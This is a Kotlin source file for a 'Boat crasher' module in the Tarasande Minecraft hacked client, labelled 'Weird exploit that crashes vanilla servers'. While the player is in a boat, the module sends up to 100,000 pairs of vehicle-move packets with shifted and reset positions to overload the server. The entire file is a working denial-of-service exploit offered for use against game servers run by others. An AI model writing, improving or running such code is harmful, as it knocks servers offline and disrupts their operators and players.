package de.florianmichael.tarasande_crasher.module

import net.minecraft.entity.vehicle.BoatEntity
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.ModuleCategory
import net.tarasandedevelopment.tarasande.util.player.chat.CustomChat

class ModuleBoatCrasher : Module("Boat crasher", "Weird exploit that crashes vanilla servers", ModuleCategory.EXPLOIT) {

    private val repeat = ValueNumber(this, "Repeat", 1000.0, 100000.0, 100000.0, 1000.0)

    private val offsetX = ValueNumber(this, "Offset x", 1.0, 3.0, 5.0, 1.0)
    private val offsetY = ValueNumber(this, "Offset y", 1.0, 3.0, 5.0, 1.0)
    private val offsetZ = ValueNumber(this, "Offset z", 1.0, 3.0, 5.0, 1.0)

    init {
        registerEvent(EventUpdate::class.java) {
            if (it.state == EventUpdate.State.POST) {
                if (mc.player!!.vehicle == null && mc.player!!.vehicle !is BoatEntity && enabled.value) {
                    CustomChat.printChatMessage("You dismounted the boat, disabled $name")
                    switchState()
                }
            }
        }
    }

    override fun onEnable() {
        mc.setScreen(null)
        if (mc.player == null) {
            switchState()
            return
        }
        if (mc.player!!.vehicle != null && mc.player!!.vehicle is BoatEntity) {
            for (i in 0 until repeat.value.toInt()) {
                val vehiclePos = mc.player!!.vehicle!!.pos // track prev pos

                // spam to random values
                mc.player!!.vehicle!!.setPos(vehiclePos.x - offsetX.value.toInt(), vehiclePos.y - offsetY.value.toInt(), vehiclePos.z - offsetZ.value.toInt())
                mc.networkHandler!!.sendPacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))

                // reset values
                mc.player!!.vehicle!!.setPos(vehiclePos.x, vehiclePos.y, vehiclePos.z)
                mc.networkHandler!!.sendPacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))
            }
        } else {
            CustomChat.printChatMessage("You need to be in a boat to use this")
            switchState()
        }
    }
}
